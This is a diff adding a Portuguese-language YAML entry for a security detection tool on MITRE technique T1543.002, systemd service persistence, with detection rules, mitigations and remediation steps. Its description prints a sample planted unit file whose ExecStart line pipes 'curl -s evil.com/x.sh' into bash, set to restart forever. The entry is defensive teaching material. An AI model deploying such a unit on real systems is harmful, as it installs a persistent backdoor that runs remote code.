@@ -1,0 +1,81 @@
+id: T1543.002
+name: Create or Modify System Process - Systemd Service
+tactic: Persistence (Persistência)
+url: https://attack.mitre.org/techniques/T1543/002/
+severity: high
+description: |
+  Atacante cria (ou modifica) uma unit do systemd pra GARANTIR que o
+  payload roda como serviço — automatic restart, log integration, boot
+  autostart, e parece "legítimo" misturado com sshd, nginx, etc.
+
+  Locais comuns onde planta:
+
+    /etc/systemd/system/<nome-inocente>.service     # admin-managed
+    /usr/lib/systemd/system/<nome>.service          # package-managed
+    ~/.config/systemd/user/<nome>.service           # user-level (sem root)
+
+  Anti-padrão típico (.service file plantado):
+
+    [Unit]
+    Description=System Update Helper
+    After=network.target
+
+    [Service]
+    ExecStart=/bin/bash -c "curl -s evil.com/x.sh | bash"
+    Restart=always
+    RestartSec=300
+
+    [Install]
+    WantedBy=multi-user.target
+
+  Características suspeitas:
+  - `ExecStart=` chamando curl/wget pra IP/domínio externo
+  - `ExecStart=` com base64 -d (obfuscação)
+  - Description genérica "System Update Helper", "Logger Service" etc
+  - Restart=always (resilience pra que não dê pra matar facilmente)
+
+detection:
+  rules:
+    - yara_critical_match
+    - yara_match_burst
+  signals: |
+    YARA match com PersistenceSystemdUnit (ExecStart com curl/wget OU
+    base64). chkrootkit checa systemd units desde versão 0.55.
+    Inventário do agente lista units e compara com baseline.
+
+mitigation:
+  - "Inventário: lista de units esperadas (do package + admin-managed)"
+  - AIDE com /etc/systemd/system/ e /usr/lib/systemd/system/ na baseline
+  - Auditd watch em diretórios de systemd unit pra detectar criação
+  - 'Auditoria periódica: systemctl list-units --type=service --state=running'
+  - "SELinux/AppArmor: serviços novos sem perfil denyall por default"
+  - chkrootkit periódico (pega assinaturas de units conhecidas)
+
+references:
+  - https://attack.mitre.org/techniques/T1543/002/
+  - https://www.freedesktop.org/software/systemd/man/systemd.service.html
+
+summary_simple:
+  what_happened: |
+    Encontramos um SERVIÇO do sistema (.service file do systemd) que
+    parece ter sido plantado por atacante. Configurado pra rodar
+    automaticamente no boot e reiniciar sozinho se for morto — clássico
+    de persistência.
+  should_worry: |
+    Sério. Se você não criou esse serviço, alguém com acesso root o
+    plantou pra manter um backdoor ativo mesmo após reboot/kill. Atacante
+    sofisticado faz isso depois de explorar uma vulnerabilidade — vai
+    embora "esquecendo" o serviço pra voltar depois.
+  what_to_do:
+    - "Veja a unit suspeita: cat /etc/systemd/system/<nome>.service"
+    - "Pare e desabilite: sudo systemctl stop <nome> && sudo systemctl disable <nome>"
+    - "Apague o arquivo: sudo rm /etc/systemd/system/<nome>.service"
+    - "Recarregue o systemd: sudo systemctl daemon-reload"
+    - "Veja todas units pra achar mais: systemctl list-unit-files | grep -v 'static\\|alias'"
+    - "Cheque outros backdoors: cron, ld.so.preload, .bashrc, webshells"
+    - "Considere reinstalar o sistema — atacante teve root, pode ter outros backdoors"
+  jargon:
+    systemd: "Init system padrão do Linux moderno. Substitui o sysvinit. Gerencia inicialização e supervisiona serviços"
+    unit: "Arquivo de configuração do systemd que define um serviço, timer, mount, etc. Termina em .service, .timer, etc"
+    ExecStart: "Diretiva da unit que diz QUAL comando rodar. Atacante coloca curl|bash ou base64 -d aqui"
+    daemon: "Processo que roda em background, geralmente como serviço do systemd. Atacante quer que o backdoor seja daemon pra parecer legítimo"
